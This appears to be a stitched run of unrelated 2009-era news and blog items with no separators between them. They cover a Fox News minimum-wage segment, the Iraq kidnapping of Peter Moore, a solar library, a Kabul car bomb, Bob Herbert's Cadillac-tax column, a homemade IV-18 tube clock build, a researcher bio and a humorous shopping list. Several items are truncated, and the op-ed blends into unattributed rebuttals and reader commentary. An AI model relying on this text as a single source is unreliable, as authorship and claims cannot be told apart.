WASHINGTON —
As the recession continues to weigh heavily on the livelihoods of millions , the Fox News Channel on Monday suggested that lowering the minimum wage could be “ better for workers . ”
“ The minimum wage is kind of like a sacred cow in Washington , with many , many lawmakers thinking it ’s a win - win for low - skilled workers , ” said Fox anchor Juliet Huddy .
“ But what if those good intentions backfired ? ”
ADVERTISEMENT
“ One school of thought says lowering the minimum wage will actually create more jobs , ” she continued , without mentioning any counterargument .
Laws enacted by Congress following the Democratic takeover in 2007 have increased the federal minimum wage to $ 7.25 an hour as of this July .
Prior to that , the minimum wage had n’t been raised since 1997 .
Inviting Fox News correspondent James Rosen to discuss the issue , Huddy first asked him : “ Why do n’t we often hear about lowering the minimum wage ? ”
Rosen said the recent minimum wage hike has set off “ a furious debate ” over its efficacy , and cited a 2008 paper called “ Minimum Wages ” by David Neumark and William Wascher that argued against the minimum wage .
He called it a “ landmark study . ”
To bolster his case , Rosen quoted Washington Post editorial writer Charles Lane as recently saying that cutting the minimum wage “ would create some jobs for those who need them most . ”

Rosen said it ’s unlikely to happen because of Democratic lawmakers who oppose it for reasons of “ social justice . ”
Republicans who favor it , he said , do so because of “ macroeconomics . ”
Fox then played a clip of Rep. Emanuel Cleaver ( D - MO ) dubbing the minimum wage “ a minimum level of justice , ” along with one of Rep. Dave Camp ( R - MI ) saying it will “ artificially raise the cost of hiring people . ”
At no point in the segment did either Huddy or Rosen mention an academic case in favor of the minimum wage — they merely reduced that side of the argument to the nebulous concept of “ social justice . ”

There are , however , accredited economic cases in favor of a strong minimum wage .
One famous study by David Card and Alan B. Krueger called “ Minimum Wages and Employment ” illustrated various ways by which increasing the minimum wage could decrease unemployment .
Its research methods and conclusions have been endorsed by Nobel Laureates Paul Krugman and Joseph Stiglitz .

Another is a 2004 research paper by the Economic Policy Institute called “ No Longer Getting By , ” which finds , among other things , that a robust minimum wage helps mitigate poverty and strengthens consumer purchasing power through periods of inflation .
Although the economy has picked up , job growth remains meek and unemployment is at 10 percent .
Americans are anxious for solutions that would create jobs and mitigate their financial woes .
According to Fox News , cutting the minimum wage is one answer to their problems .

GuardianFilms has exclusively uncovered the story of what happened to the five Britons kidnapped in Iraq guardian.co.uk
The five British men kidnapped in Iraq were taken in an operation led and masterminded by Iran 's Revolutionary Guard , according to evidence uncovered during an extensive investigation by the Guardian .
The men – including Peter Moore , who was released today after more than two years in captivity – were taken to Iran within a day of their kidnap from a government ministry building in Baghdad in 2007 , several senior sources in Iraq and Iran have told the Guardian .
They were incarcerated in prisons run by the al - Quds force , a unit that specialises in foreign operations on behalf of the Iranian government .
One of the kidnappers has told this paper that three of the Britons – Jason Creswell , Jason Swindlehurst and Alec Maclachlan – were subsequently killed after the British government refused to take ransom demands seriously .
Last night it emerged that part of the deal that led to the release of Moore involved the handing over of a young Shia cleric , Qais al - Khazali , a leading figure in the Righteous League , which emerged in 2006 and stayed largely in the shadows as a proxy of the Iranian Revolutionary Guard 's elite unit , the al - Quds forces .
Khazali was last night handed over by the US military for release by the Iraqi government .
The year - long Guardian investigation can also reveal that :
• Moore was targeted because he was installing a system that would show how a vast amount of international aid was diverted to Iran 's militia groups in Iraq .
• The bodyguards ' bodies were eventually traded for the release of Iraqi prisoners .
• They had probably been dead for at least 18 months before three of their bodies were handed over earlier this year .
Moore , 37 , a computer expert from Lincoln , and the four security guards were taken on 29 May 2007 from the Iraqi ministry of finance 's technology centre in Baghdad .
He had been a contractor working to install sophisticated software in the ministry to track down billions of dollars in international aid and oil revenues .
A group of up to 100 men entered the building and took the Britons , racing off into Baghdad traffic in a fleet of Toyota Land Cruisers .
A sixth man – who the Guardian can reveal was Peter Donkin – was left by the kidnappers after he managed to hide under floorboards .
A former Iranian Revolutionary Guard member , speaking to this paper under condition of anonymity , said the extraordinary kidnap was masterminded by Iran .
The man , a former major who worked for 14 years inside the Iranian organisation and claims to have taken part in kidnap operations himself , believes the hostages were held in two al - Quds camps in Iran – one known as Qasser Shiereen military camp , close to the Iraqi border crossing with Mehran , and a second camp known as the Tehran Pars , located near a salt lake north - east of Qom .
" It was an Iranian kidnap , led by the Revolutionary Guard , carried out by the al - Quds force , " he said .
" My contact works for al - Quds .
He took part in the planning of the kidnap and he watched the kidnapping as it was taking place .
He told me that they spent two days at the Qasser Shiereen camp .
They then took them deep inside Iran . "
This claim is backed up by a serving Iraqi minister with close links to Iran .
" This was an IRG [ Iranian Revolutionary Guard ] operation , " he said .
" You do n't think for a moment that those militia groups from Sadr City could have carried out a high - level kidnapping like this one . "
A former intelligence chief at the Iraqi ministry of defence has also described to the Guardian how intelligence operatives followed the kidnappers as they took the hostages from a mosque in Baghdad 's Sadr City to the Iranian border .
" They were hooded and handcuffed , then the cars drove off in a new direction – they were headed towards the Iranian border , " the intelligence chief said .
While the hostages were in Iran the kidnappers made sure those who took care of them were Iraqi nationals .
" At all times they were surrounded by Iraqi voices .
Everything was done to make sure they had no idea they were in Iran , " said an Iranian source with knowledge of the kidnap .
The other Britons captured with Moore were all security guards .
The bodies of Swindlehurst and Creswell were identified in June , followed by Maclachlan in September .
McMenemy is also believed dead , although his body has not been returned .
It is not clear where the men were killed .
Their bodies were buried inside Iraq and information about their locations was traded for prisoner releases .
A Guardian report in July revealed evidence that Iraqi officials colluded in the kidnap of the five , and that one motive was to prevent millions of dollars of aid money from being tracked – including an estimated $ 18 bn that had gone missing .
A former senior Iraqi intelligence chief claims the project Moore was working on would have laid bare exactly where all Iraq 's money was going .
He claims there was an Iranian link to the alleged financial cover - up .
The Foreign Office said last night : " We have no evidence that the British hostages , including Peter Moore , were held in Iran .
We are not in a position to say with any certainty where they were held during each and every single day . "
BOUTTE , La. � A 44 - year - old woman was booked with second - degree battery after allegedly pouring a pot of boiling grits onto her sleeping boyfriend .
St. Charles Parish sheriff 's deputies said Carolyn Brown caused second - degree burns on the man 's face and arms .

Green technologies used to make Anythink Brighton the first “ carbon neutral ” library in the nation also may allow the Rangeview Library District to sell more than $ 30,000 a year in electricity back to utility providers .
Rangeview , which serves Adams County , decided to go green with its newest library branch when the planning began more than two years ago , said Dot Lindsey , vice president of the district ’s board of trustees .
Anythink ’s geothermal heating and cooling system built underneath its parking lot , its array of sustainable cost - saving features and its 357 state - of - the - art rooftop solar panels easily cost $ 1.25 million , said library director Pam Sandlian Smith .
The entire construction project cost about $ 6.5 million .
“ We made this commitment ( to building a sustainable library ) because it ’s the right thing to do , even if it does n’t pencil out immediately , ” said Justin Sager , project manager at the Rangeview district , of the cost of construction .
“ Getting green takes spending the green , ” Lindsey said .
But many libraries in the metro area are closing or slashing hours in the wake of budget cuts .
In Aurora alone , four libraries plan to permanently close their doors Dec. 31 .
The Rangeview district ’s ability to renovate three of its buildings and construct another four from the ground up amid an economic downturn lies in its timing , said Steven Hansen , Anythink ’s communications director .
“ We were at the right place of the curve where we could take advantage of the community ’s intense interest in improving its public libraries , and in this weak economy a lot of contractors were looking for work , so we could make better deals on sustainable projects , ” Hansen said .
A $ 300,000 matching grant from the Colorado Department of Local Affairs for the library ’s solar photovoltaic system helped too .
The library ’s new PV system provides 108 kilowatts of power to the new building and at certain points of the day produces more than the library requires , spilling back into the electric grid that serves the Rangeview district .
“ We ’re building a beautiful building that will save taxpayers money , will sustain our community and take care of our environment , ” Smith said .
Though there is no precise timeline as to when the district ’s greening money will pay itself off , Sager estimates the geothermal heat pump may pay for itself in 30 years , while the new PV system should pay back sooner , maybe in 20 years .
“ As energy costs continue to rise , it ’ll make some of the more costly decisions even smarter , ” Sager said .
The Anythink Library in Brighton has places to sit near a fireplace , areas to listen to music , a teen space and meeting rooms .
The entire south - facing wall is open glass , capitalizing on winter sunshine to light and heat the room .
“ It ’s a library for the 21st century , ” Smith said .
“ The basic idea behind all our libraries is creating spaces where people can interact with information in an interesting learning space . ”
Since opening in September , Anythink already has doubled its circulation and number of people who use the library , Smith said .
A collaborative effort from the Rangeview district board of trustees , Humphries Poli Architects , Fransen Pittman General Contractors , Ambient Energy and Namaste Solar helped move the construction forward .

CLARIFICATION : Although the Rangeview Library District and one of
its consultants , Ambient Energy , described the new Anythink
Brighton library branch as “ carbon positive , ” meaning the
building has a “ positive ” impact on the environment , the common
terminology for a building that generates more energy than it uses
is “ carbon neutral ” or “ carbon negative . ”
KABUL , Afghanistan 
A suicide car bomber struck outside a hotel popular with foreigners on Tuesday , killing at least 8 people and wounding 40 others , the Afghan authorities said .
Four women were among the dead , according to the Interior Ministry .
The explosion occurred just outside the hotel and several buildings owned by a former Afghan vice president , Ahmed Zia Massoud , who may have been the target .
Mr. Massoud is the brother of the guerrilla leader Ahmad Shah Massoud , who battled Soviet forces during the 1980s and was assassinated by a suicide bomber on Sept. 9 , 2001 , two days before the terrorist attacks against the United States .
The Afghan president , Hamid Karzai , said during a televised speech at a conference on corruption on Tuesday that two of Mr. Massoud ’s bodyguards had been killed .
An aide said that Mr. Massoud was unharmed , and that he believed the target might have been the Heetal Hotel , which is owned by relatives of Burhanuddin Rabbani , a former Afghan president and mujahedeen leader .

OP -ED COLUMNIST
A Less Than Honest Policy
by BOB HERBERT
There is a middle - class tax time bomb ticking in the Senate 's version of President Obama 's effort to reform health care .
The bill that passed the Senate with such fanfare on Christmas Eve would impose a confiscatory 40 percent excise tax on so - called Cadillac health plans , which are popularly viewed as over - the - top plans held only by the very wealthy .
In fact , it 's a tax that in a few years will hammer millions of middle - class policyholders , forcing them to scale back their access to medical care .
Which is exactly what the tax is designed to do .
The tax would kick in on plans exceeding $ 23,000 annually for family coverage and $ 8,500 for individuals , starting in 2013 .
In the first year it would affect relatively few people in the middle class .
But because of the steadily rising costs of health care in the U.S. , more and more plans would reach the taxation threshold each year .
Within three years of its implementation , according to the Congressional Budget Office , the tax would apply to nearly 20 percent of all workers with employer - provided health coverage in the country , affecting some 31 million people .
Within six years , according to Congress 's Joint Committee on Taxation , the tax would reach a fifth of all households earning between $ 50,000 and $ 75,000 annually .
Those families can hardly be considered very wealthy .
Proponents say the tax will raise nearly $ 150 billion over 10 years , but there 's a catch .
It 's not expected to raise this money directly .
The dirty little secret behind this onerous tax is that no one expects very many people to pay it .
The idea is that rather than fork over 40 percent in taxes on the amount by which policies exceed the threshold , employers ( and individuals who purchase health insurance on their own ) will have little choice but to ratchet down the quality of their health plans .
These lower - value plans would have higher out - of - pocket costs , thus increasing the very things that are so maddening to so many policyholders right now : higher and higher co-payments , soaring deductibles and so forth .
Some of the benefits of higher - end policies can be expected in many cases to go by the boards : dental and vision care , for example , and expensive mental health coverage .
Proponents say this is a terrific way to hold down health care costs .
If policyholders have to pay more out of their own pockets , they will be more careful -- that is to say , more reluctant -- to access health services .
On the other hand , people with very serious illnesses will be saddled with much higher out - of - pocket costs .
And a reluctance to seek treatment for something that might seem relatively minor at first could well have terrible ( and terribly expensive ) consequences in the long run .
If even the plan 's proponents do not expect policyholders to pay the tax , how will it raise $ 150 billion in a decade ?
Great question .
We all remember learning in school about the suspension of disbelief .
This part of the Senate 's health benefits taxation scheme requires a monumental suspension of disbelief .
According to the Joint Committee on Taxation , less than 18 percent of the revenue will come from the tax itself .
The rest of the $ 150 billion , more than 82 percent of it , will come from the income taxes paid by workers who have been given pay raises by employers who will have voluntarily handed over the money they saved by offering their employees less valuable health insurance plans .
Can you believe it ?
I asked Richard Trumka , president of the A.F.L. - C.I.O. , about this .
( Labor unions are outraged at the very thought of a health benefits tax . )
I had to wait for him to stop laughing to get his answer .
“ If you believe that , ” he said , “ I have some oceanfront property in southwestern Pennsylvania that I will sell you at a great price . ”
A survey of business executives by Mercer , a human resources consulting firm , found that only 16 percent of respondents said they would convert the savings from a reduction in health benefits into higher wages for employees .
Yet proponents of the tax are holding steadfast to the belief that nearly all would do so .
“ In the real world , companies cut costs and they pocket the money , ” said Larry Cohen , president of the Communications Workers of America and a leader of the opposition to the tax .
“ Executives tell the shareholders : ‘ Hey , higher profits without any revenue growth .
Great ! ' ”
The tax on health benefits is being sold to the public dishonestly as something that will affect only the rich , and it makes a mockery of President Obama 's repeated pledge that if you like the health coverage you have now , you can keep it .
Those who believe this is a good idea should at least have the courage to be straight about it with the American people .
Bob Herbert 's column today is n't so much a good argument against the excise tax as it is an example of why cost control will be virtually impossible , and thus national bankruptcy -- a real decrease in wages -- is a near - certainty .
Herbert argues that the excise tax will push people toward less expensive insurance premiums and begin to tax some portion of some health - care plans .
Both are true .
I 'd say this is a good thing .
He says it 's a bad one .
Distilled to its essentials , Herbert is arguing that , even at the high end , more expensive insurance policies are better insurance policies , and that the government should be subsidizing their purchase .
Does that sound like a world in which we 're going to control costs ? . . .
[ T ]he people who receive that subsidy like receiving it .
But the unemployed do n't get any of that money , nor do people whose employers do n't offer them insurance .
The tax preference is huge , regressive , and encourages more spending on health - care insurance .
And beyond all that , it separates workers from the cost of their health - care insurance , which is one of the main drivers of our cost problems .
. . .
There is no way to sharply cut costs in a fifth of the economy without there being losers .
And those losers wo n't all be Goldman Sachs executives .
They wo n't all be providers ( indeed , if you cut provider costs too much , they stop accepting patients , and then the patients lose ) .
There 's really no way around it .
Even single - payer would bring a lot of losers with it , taking people in Cadillac plans and downgrading them to the same Camry as everyone else .
. . .
[ A]t some point , we need to start trying cost control .
If the policy does n't work , if it hits people too hard and falls on the wrong plans , well , little is easier to repair than an unpopular tax .
But little is harder to do in the first place than cost control .
Those who would kill this attempt should think really hard about what their counter - policy is , and who will lose from that policy , and why that is preferable , and whether it can actually pass , and where we 're left if it does n't , and who loses from that .
Cost control has losers , unfortunately .
Herbert 's column is proof of that .
But not controlling costs has the most losers of all .
#
The subject of the " Cadillac tax " on supposedly exclusive - to - the - super - execs health care insurance plans has been questioned frequently .
I have a bad feeling that my own plan , which I consider " adequate , " and is my one real employment " perk , " and maybe the thing that most ties me to a job I 'm far from crazy about , either qualifies or is going to , and believe me , I 'm not any kind of fat cat .
It would have been easier for me to know back in the days when , at each year 's benefits meeting , we were told both the old and new figures for the portion coming out of our paychecks as well as the percentages of the total costs our contributions represented .
In recent years , curiously , we 've been told only , meaning we have to dig out an old pay stub just to compare it with our previous year 's contribution .
I 'm guessing we 're paying a significantly higher percentage of the total cost than we used to , but considering the skyrocketing total cost , I worry that the amount of the company 's contribution is going to put us in that " Cadillac " class .
Today Bob Herbert devotes a whole column to the subject , and it's not exactly reassuring .
The 's Ezra Klein has posted a response to Bob Herbert 's column .
Here are some excerpts : I wish I were equipped to evaluate this , but as with so much of the health care debate , we 're stuck choosing mostly blindly among our " experts . "
One thing I do know is that when E.K. suggests , " If the policy does n't work , if it hits people too hard and falls on the wrong plans , well , little is easier to repair than an unpopular tax , " I assume he 's kidding .
Because I 'm sure he knows as well as anybody that once my health care benefits are dismantled , I 'm never getting them back .

Update :
All the design files and build information is now available at http://vonnieda.org/tc18
So , back in September the company I worked for , Displayware , ceased operations .
That ’s a fancy way of saying we went out of business .
We did that because we ran out of money and did n’t have enough coming in to sustain the very meager workforce we had .
Since then I ’ve been unemployed , but mostly as a choice .
I had money in the bank and was pretty burned out from the Displayware days so I decided to just take some time off and work on my own stuff and chill out .
Right before that happened , Ladyada of Adafruit released her design for a clock based on an old Russian vacuum fluorescent display tube called an IV - 18 .
I thought the clock circuit was really cool and the tube was great but I did n’t care much for the acrylic case .
A day or two later I somehow came across a Slashdot article about it and was reading some of the comments when I saw someone comment on the case and post a picture of his own design .
THIS was the clock I wanted .
I totally fell in love with the clock design and decided I must have one .
This short conversation , via Slashdot comments , followed :
I never did hear back from John .
I assumed he just never saw the comment .
I spent some time trying to find an email address but eventually gave up and instead decided just to build it myself .
One of the things I decided to do when Displayware croaked was spend some time learning how to use my CNC mill .
I bought a 3 axis mill in November f 2008 but had never really took the time to learn to use it .
So , I spent many days getting up early , going out the garage and not coming out till Courtney got home from work .
Those were very enjoyable days .
My hands were dirty and cut , I was chopping up bits of metal and programming the mill and learning new stuff every day .
Eventually I got to the point that I felt like I could make stuff on the mill so the next step was to learn how to use CAD and CAM .
I downloaded a CAD system and set to work learning how to use it .
That took some time but eventually I was able to design the three metal plates I saw in the clock picture .
Since all I had to work with was a single graphic from one angle I had to guess at a lot of things but I think I eventually came up with dimensions that were pretty close to original .
The only real dimensions I was sure of were those of the tube itself , so I used what I knew about that to take educated guesses at the rest .
Once I had designs ready to go I bought some sheets of stainless steel and went about trying to cut the clock parts out from it .
I used stainless because from the rendering of the clock that ’s what I thought it was supposed to be .
It turned out that it was nearly impossible for me to cut stainless on my little mill , so I switched to aluminum sheet and had much better luck .
I cut the six plates out and sanded them a bit and set them aside .
The next step was to make the metal pipes that connect the whole thing together .
From the picture I thought these were polished aluminum so that ’s what I started with .
I bought some 6061 aluminum tube from Online Metals ( where I get everything in this post ) and set to trying to make it pretty .
The process I eventually came up with is that I would take these 12 ″ sections of tube and stick one end into the chuck of my drill press .
Set the speed to the lowest it would go and turn it on .
Then I started with 250 grit sandpaper running up and down the spinning tube .
Then 500 grit , then 1000 , then 2000 .
After all that the tube is looking pretty smooth so I took some polishing compound to it and that really made it shine .
It looked just like the picture .
I cut out 8 1/2 ″ sections and 4 4 ″ sections , drilled the small ones through to widen the inner diameter to 1/4 ″ and then tapped both ends of the larger ones so they would accept bolts .
The next step was to find a LOT of o-rings .
If you look at the picture you ’ll see there are 24 o- rings used between all the pieces of tube .
It ’s an awesome design element and I wanted to stick with it .
Unfortunately , when I went to the plumbing store I could only find about 4 - 6 of the ones I needed and they were almost a buck a piece .
The o-rings would cost more than the rest of the clock !
Eventually I decided to check McMaster - Carr , who I had never ordered from before , and it turned out I could buy bags of 100 for something like $ 1.34 total .
That worked !
The final step in the design was the black perforated metal sleeves around the ends of the clock .
I had been worrying about these for a while .
I figured I could get perforated metal just fine , and bend it into shape maybe , but I had no idea how I would connect it at the bottom and make it look nice .
I started researching welding aluminum and I started looking for used TIG welders .
Since I could n’t really afford any of the welders I was seeing I decided to just try hacking it together .
What I ended up doing was using my mill to cut down a sheet of perforated aluminum to a 1 ″ thick strip about 14 ″ long .
Then I made another CAD model .
This one was of the shape that would fit inside this sleeve .
I used this on the mill to cut out 2 3/4 ″ MDF forms which I glued together to make a single 1.5 ″ form .
Using this form , a heavy pair of leather gloves and a heat gun I heated the aluminum up till it started to be easier to bend and then wrapped it around the form .
I stuck a clamp on it to hold it shut and then I broke off a 1/2 ″ long strip of the same stuff from another piece .
I put this inside the sleeve and super - glued it down to hold the sleeve together .
The super - glue worked okay but I knew I could pop it apart pretty easily if I wanted to .
So , my next idea was JB Weld .
This worked great !
I mixed up some JB Weld , smeared it all over the inside of the sleeve and over the little brace and let it set up .
After that it was rock solid .
I sanded the whole thing down , spray painted it gloss black and called it good .
Once everything was dry I finally was able to put the whole thing together .
After many weeks of work , here ’s what I had .
I was pretty happy with it !
I thought it looked quite a bit like what I was seeing in the image and for having started with nothing but a picture on the Internet I thought it was going pretty well .
So , it was time to work on some electronics .
Somewhere along the way I ordered 5 of the IV - 18 tubes from eBay .
They were surprisingly cheap .
I think I paid like $ 15 .
They actually came from Moscow , so that was pretty exciting .
Unfortunately , they did not come with a datasheet and I did n’t really have a a pinout for the things .
I spent an hour or two with a loupe and headache looking at all the little wires inside and figuring out a pinout .
A day later the seller emailed me a datasheet .
Oh well .
One of the enabling elements of this whole thing was that when Ladyada posted her clock design she also posted schematics and notes .
This allowed me to learn about boost converters , which are circuits that allow you to take a very low voltage and make a very high voltage pretty easily .
I knew about boost converters , but I had no idea they could be so easy to build .
Ladyada ’s designs really made that clear and she even posted a calculator for figuring out the proper values .
The IV - 18 tube requires about 20v ( volts ) to light up and 50 v really makes it look great .
She was using a 9v wall wart to power her clock and decided that sounded good to me , so I set out to design a boost converter that could convert 9v to 20 - 50 v .
The way a boost converter works is that it takes the input voltage , runs it through an inductor and then chops it off to increase the voltage .
An inductor is a electronic component that is as simple as a piece of wire wrapped around an iron core .
The interesting thing about inductors is that they have electrical inertia .
Once you start running power through them they like to keep it going .
So , if you suddenly cut off the power the inductor tries to keep the power flowing .
Ohm ’s law being what it is , since the inductor ca n’t keep the same amount of current flowing the voltage starts to increase .
By simply running a low voltage through an inductor and then turning it off the voltage inside the conductor can suddenly jump to many times what you put in , albeit at a much lower current .
So , to make a circuit that turns 9v into 50 v we run 9v through an inductor and turn it off and on many times per second .
We store these high voltage pulses in a capacitor until they make up enough to flow the current we need and we have a high voltage power supply .
The ratio of how long the inductor is on versus off determines how high we boost .
You can learn more about boost converters at Ladyada ’s page : http://www.ladyada.net/library/diyboostcalc.html
So , with all that in mind I bought a bunch of components and more specifically , I bought a bunch of different values of inductors .
I wanted to see how different values affected the output .
I built the boost converter circuit on a breadboard and used an Arduino to drive the pulses and started plugging in different inductors .
Using my oscilloscope I was able to learn about constant conduction and learn more about ripple and power draw on my circuit .
I eventually learned that I could run my converter using a 220uH inductor and a 22uF capacitor and easily get 20 - 60 v out of it at the current I needed without pulling the inductor out of constant mode .
So , I had a power supply .
The next step was to try to drive the tube .
I used the same VFD driver Ladyada was using in her clock and I got Maxim to send me a few samples for free .
The driver is a MAX6921 chip .
It is basically a shift register that controls 20 output at up to 76 v each .
It ’s pretty awesome .
At this point I needed a circuit board to wire everything up so there ’s a solid week or two where I tried different ways of making boards .
I wo n’t go into it all now , but the basic process I came up with is using my laser printer to print a transparency , use a UV tube to expose a positive resist board through it , etch with the sponge method using ferric - chloride and then drill all the holes using the mill .
I have another long post in the works that describes that whole process .
I ended up making my first ever home made double sided board that had pinouts to hold the IV - 18 tube and the MAX6921 chip .
Once that was all hooked up I wrote a bunch of code and used an Arduino to drive it and I had a working tube !
That first board looked like this :
Using this board and my Arduino I was able to basically write the entire program that runs the clock .
I wrote all the driver routines , communication and time keeping .
I considered at one point just making my circuit compatible with Ladyada ’s code to save some time but after looking at her source I had some different ideas of how I wanted to do things so I just started from scratch .
The next step was to start working on the real board .
I had known all along I wanted to make a single board that would fit inside the black sleeve and I knew I wanted it to be surface mount .
I really enjoy working with surface mount components and I knew I ’d need to use small components to get everything I wanted in the sleeve .
This took a pretty long time .
It was the most complex circuit I had ever designed and I ended up adding a lot more to it than I expected to .
After working on keeping time in the Arduino for a while I decided it just was not accurate enough for me and I decided to add a DS3231 real time clock .
This chip basically has everything needed to keep super accurate time and it ’s easy to communicate with .
So , I ordered up some free samples and went back to the garage to build a breakout board for that chip .
After getting this board made and soldered up I was able to start using it with the Arduino to handle time keeping and things really started to come together .
At this point I had this giant mess on my desk consisting of an Arduino , a breadboard holding the boost converter circuit , another breadboard holding the click chip and the tube + driver board .
I soon added some long wires and a rotary encoder to the mess and I finally had all the major components of the clock actually on my desk and working .
I wish I had a picture of the mess .
Mess or not , this allowed me to write all the code I needed to run the clock .
The code handles talking to the DS3231 for getting the time , talking to the MAX6921 to drive the tube , drives and monitors the boost converter , read interrupts from the rotary encoder to drive a menu system and a dozen other little things .
It ’s extremely interrupt driven and I think it ’s the nicest AVR code I ’ve ever written .
With all the parts together and working it was time to “ capture ” the schematic .
This is what engineers call it when they take the mess on their desk and turn it into a nice , tidy computer drawing .
I used Eagle to completely design the circuit and I got to work designing the board to match it .
A few weeks later I had a board design and I sent it off to Gold Phoenix for manufacturing .
This board worked really well , except for a few small errors .
The main errors were that I forgot to hook up one pin of the CPU which meant I could n’t put any code on it and the other was that I determined I needed a pull down resistor on my boost controller ’s MOSFET for protection .
I soldered these fixes on manually and put the board together and I finally had a clock !
This board allowed me to do all the final bug fixes and get everything ready to actually build the clock .
One big problem though was that I had put components too close to the four holes around the edges and had no way to really bolt the thing down .
With the electrical errors in mind and this physical issue I decided to do another version of the board and for fun decided to get the board made black .
Another payment to Gold Phoenix and a week of nail biting and I had my final , final board .
While I waited for those boards to show up I ended up redrawing the CAD drawings for the three metal frames .
I needed them to be a little bigger to make everything fit nicely .
I also determined I needed 1/4 ″ long versions of the small tubes instead of 1 /2 ″ ones so I made those .
I got that work done and eventually the boards and parts showed up .
Yesterday I finished final assembly , drilled a few holes in one of the sleeves for the power and rotary encoder , put the thing together and finally , after nearly four months of work I was finished * .
The eagle eyed among you ( like anyone is actually still reading ) will notice some flaws .
I scratched up the right sleeve while drilling it , so it needs to be repainted .
I think I ’ll repaint both of them and put a layer of clear coat on them for protection .
The holes in the back are also sloppy , so the right sleeve will probably get remade completely .
The small tubes on the left are longer than the right and I ’ll probably fix that today .
Just need to cut four smaller ones like the right .
And the middle pipes need to be about 1 / 4 ″ longer to show the entire display .
Aside from those minor things , the project is done !
It was a ton of work , and a ton of learning but it ’s been great fun and very rewarding .
Last night , to clear up loose ends , I finally spent some time tracking down an email address for John .
I wrote him a long letter explaining all this and he wrote back and was very cool about the whole thing .
He asked that I give him credit for the design , which I am very happy to do .
I make no claim to the design of the enclosure .
It ’s wholly dreamed up and designed by John Pfeiffer at http://blog.giantpachinkomachineofdoom.com/
I ’m really glad he designed it , and posted that picture of it and even more so that he was very understanding about my little obsession .
I think the enclosure is gorgeous and had I not seen it I never would have started this project .
I ’d also like to thank Ladyada of Adafruit at http://www.adafruit.com.
Her clock design gave me the understanding I needed for the electronics side of this project .
While the end result is , I think , quite different from her design it ’s definitely got it ’s roots in the Ice Tube clock kit that she sells .
The kit looks great and you should probably go buy one now !
From here , I intend to open source the whole mess .
I have some cleaning up to do but once it ’s done I ’m going to post the code , schematics , CAD drawings , bill of materials and everything I used to build it .
Unless you have a machine shop at your disposal , or a massive obsession like myself , you probably wo n’t make one like it but maybe you ’ll see something that gives you the idea to make something even cooler .

Currently , I ’m working on a distributed systems programming framework , called Orleans , which was released as open source in January , 2015 and is widely used inside and outside Microsoft .
I gave a keynote about it at DISC 2014 ( slides ) .
In the last few years , I ’ve worked on projects to enrich Orleans to be an “ actor - oriented database system ” .
I described the vision in a keynote at ICDE 2018 ( slides ) .
You can read about the following components : indexing ( CIDR 2017 ) , geo -distribution ( OOPSLA 2017 ) , and transactions ( technical report ) — all of which are available on GitHub .
My early research was primarily on transaction processing and , after a long hiatus , I resumed working in this area in 2006 as a co-designer of the database engine for SQL Azure .
I then focused on building Hyder , a prototype transactional indexed - record manager that scales out without partitioning .
I co-authored a survey of techniques for multi-master replication ( SIGMOD 2013 ) and two books on transaction processing :
Principles of Transaction Processing ( 2nd edition ) , coauthored with Eric Newcomer , was published in June 2009 by Morgan - Kauffman Publishers , a division of Elsevier .

My other main research interest is data integration .
From 2000 – 2011 I led the Model Management Project , whose goal was to make database systems easier to use for model - driven applications , such as design tools , message translators , and database translators .
I also worked on object - to - relational mapping , especially in support of the ADO.

Hollywood Reporter has picked up an item on the blog of Dan Savage — a popular sex - and - advice columnist whose work appears , among other places , at The A.V. Club — that Savage is taping a " non-airing presentation pilot " for HBO .
What 's it all about ?
Here 's Savage :
According to a draft of press release that 's sitting on my desk here at HBO — in my own office !
with a lock on the door !
I could be naked in here !
—" Savage Love , " the ( potential ) teevee show , " will focus on current events and cultural trends with sex as the filter . "
I 'm hoping to bring a new kind of conversation to TV about sex — an honest conversation , one that 's informed without being ( too ) wonky , funny without being ( too ) cruel , sexy without being ( too ) cheesy .
Basically , my sex - advice column — but on the teevee !

So there you have it .
We 're pretty sure we 're not alone when we say we'd watch that show .
Syracuse University is planning a pilot program for next fall that will allow students to live with a member of the opposite sex in on - campus housing .
Terra Peckskamp , interim director of the Office of Residence Life , told the Daily Orange on Tuesday that the program will be open to sophomores , juniors and seniors , and they will only be allowed to live in two - person suites and South Campus apartments .
Amit Taneja , associate director of SU 's LGBT Resource Center , said the university is gathering feedback from student groups in an effort to make this program successful .
" At the end of the day this policy is coming as a result of the request made by students and parents , " Taneja said , " Who are we to say you need to live with a male or you need to live with a female ? "
Daily Orange :
What do you think -
Should students of the opposite sex be allowed to live together on campus ?

The Christmas shopping season is here and that means just one thing – the Official Icarus Landing Drunken Christmas Shopping Spree !
Woo - hoo !
So without further ado , here , below , with pictures , are some of the cool , cool , cool gifts that nobody asked for and that I ’ve gotten for people on my Christmas list while thoroughly , completely , blissfully , and totally blitzed out of my skull …
The Versatile Mixing Bowl
This awesome , awesome mixing bowl is a gift for Icarus , who is enjoying cooking a great deal .
Apparently you can do a lot of different things with this bowl , mixing included , because it has a wide opening and holds lots and lots of various fluids and solids and things and can be used in the kitchen or bedside if needed .
Merry Christmas , son !
You just know your Dad loves you very much when you get a gift this good !
‘ The Grand Ruler ’ Anubis Statue
This is one of my ‘ big ’ gifts for Mrs. Daedalus this year .
By big I mean over eight feet tall .
Why ?
Well , this is The Official Icarus Landing Drunken Christmas Shopping Spree !
I do n’t have to have a good reason .
I guess because except for the weird pseudo animal - like pagan worship head , it kind of reminds me of me – swarthy and muscular , good - looking in a short gold skirt , ready to protect my bride ’s Egyptian palace [ yeah , we have one .
What of it ? ] .
And only $ 1,799 – a steal to boot !
Best thing of all about it ?
Comes complete with scepter and ankh .
That ’s right !
Scepter and ankh !
The Sarcophagus of King Tuthankhaman Bookshelf Cabinet
This is a gift for The Official Uncle of Icarus Landing , Uncle Thomus .
From Design Toscano for only $ 800 and because when I see the word ‘ sarcophagus ’ , it just makes me all giggly inside and makes me think about Thomus and go all soft and stuff .
And because he always gets me something nice for Christmas , too , like beer .
For $ 20 .
The Inada Sogno ‘ Dreamwave ’
This is just a little something I bought for myself – a total massage total high tech total body total chair , just $ 6,499 [ seriously ! ] .
Aka The Expensive Chair Thingy .
Did I mention this is for me ?
As in , when I ’m sober ?
As in , for nobody else !
After all , it ’s Christmas !
Just a minor little indulgence , since the success of IL has made me such a wealthy man .
The Risen Jesus Statue
This is the ‘ perfect ’ gift for The Other Official Uncle of Icarus Landing , Uncle Ernestus , because he is an avowed atheist and this will really piss him off .
But in a good way !
In a ho - ho - ho way !
Right ?
Jeez , I thought about him the second I saw this !
So he better like it !
After all , it includes the rough - hewn stone that was rolled away and the inscription of John 11:25 -2 !!!
At $ 650 , that ’s almost a bargain !
Almost .
